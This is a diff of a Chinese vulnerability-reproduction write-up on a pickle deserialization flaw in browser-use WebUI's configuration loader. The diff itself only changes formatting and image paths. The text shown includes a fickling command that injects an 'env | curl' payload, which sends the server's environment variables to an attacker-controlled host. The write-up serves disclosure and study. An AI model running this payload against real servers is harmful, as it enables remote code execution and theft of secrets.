@@ -2,13 +2,13 @@
 
 ## 漏洞描述
 
-browser-use WebUI 是基于 browser-use 的 AI Agent 应用。2025 年 4 月，互联网上披露其旧版接口 update_ui_from_config 存在一个 pickle 反序列化漏洞，未经授权的远程攻击者可以利用该接口发送恶意的序列化数据，实现在服务端执行任意代码，导致服务器失陷。
+browser-use WebUI 是基于 browser-use 的 AI Agent 应用。2025 年 4 月，互联网上披露其旧版接口 update\_ui\_from\_config 存在一个 pickle 反序列化漏洞，未经授权的远程攻击者可以利用该接口发送恶意的序列化数据，实现在服务端执行任意代码，导致服务器失陷。
 
 参考链接：
 
-- https://github.com/browser-use/web-ui/commit/7fdf95edaeaf2505b36c10966b7b8d65359f1de6
-- https://research.kudelskisecurity.com/2025/04/23/getting-rce-on-browser-use-web-ui-ai-agent-instances/
-- https://github.com/browser-use/web-ui/tree/v1.6
+* https://github.com/browser-use/web-ui/commit/7fdf95edaeaf2505b36c10966b7b8d65359f1de6
+* https://research.kudelskisecurity.com/2025/04/23/getting-rce-on-browser-use-web-ui-ai-agent-instances/
+* https://github.com/browser-use/web-ui/tree/v1.6
 
 ## 披露时间
 
@@ -54,13 +54,13 @@ pip install gradio==5.23.0
 
 环境启动后，访问 `http://your-ip:7788/`，此时 WebUI 1.6 已经成功运行。
 
-![](images/browser-use%20WebUI%20pickle%20反序列化漏洞/image-20250507140601827.png)
+![](../.gitbook/assets/image-20250507140601827.png)
 
 ## 漏洞复现
 
-漏洞位于 `src/utils/default_config_settings.py`，服务器未对用户上传的 `.pkl` 配置文件进行校验，攻击者可以加载包含任意代码的恶意 pickle 文件：
+漏洞位于 `src/utils/default_config_settings.py`，服务器未对用户上传的 `.pkl` 配置文件进行校验，攻击者可以加载包含任意代码的恶意 pickle 文件：
 
-![](images/browser-use%20WebUI%20pickle%20反序列化漏洞/image-20250507141416084.png)
+![](../.gitbook/assets/image-20250507141416084.png)
 
 首先，我们创建一个名为 `default.pkl` 的常规 pickle 配置文件，其中包含默认的 WebUI 配置：
 
@@ -128,7 +128,7 @@ if __name__ == "__main__":
     save_config_to_file(default_config(), save_dir=".", name="default.pkl")
 ```
 
-接下来，我们安装 [fickling](https://github.com/trailofbits/fickling) 并使用它将恶意代码注入 pickle 文件。以下命令将生成一个名为 `malicious.pkl` 的恶意文件，该文件在加载时，将运行 `env | curl -XPOST http://your-ip:9999 --data-binary @-` ，泄露目标服务器的环境变量到攻击者服务器：
+接下来，我们安装 [fickling](https://github.com/trailofbits/fickling) 并使用它将恶意代码注入 pickle 文件。以下命令将生成一个名为 `malicious.pkl` 的恶意文件，该文件在加载时，将运行 `env | curl -XPOST http://your-ip:9999 --data-binary @-` ，泄露目标服务器的环境变量到攻击者服务器：
 
 ```
 # 安装依赖
@@ -140,11 +140,11 @@ fickling --inject "os.system('env | curl -XPOST http://your-ip:9999 --data-binar
 
 最后，我们通过 WebUI 的 Configuration 选项卡加载此文件：
 
-![](images/browser-use%20WebUI%20pickle%20反序列化漏洞/image-20250507142719674.png)
+![](../.gitbook/assets/image-20250507142719674.png)
 
 监听 `9999` 端口，即可接收到 `env` 的执行结果：
 
-![](images/browser-use%20WebUI%20pickle%20反序列化漏洞/image-20250507143023954.png)
+![](../.gitbook/assets/image-20250507143023954.png)
 
 ## 漏洞修复
 
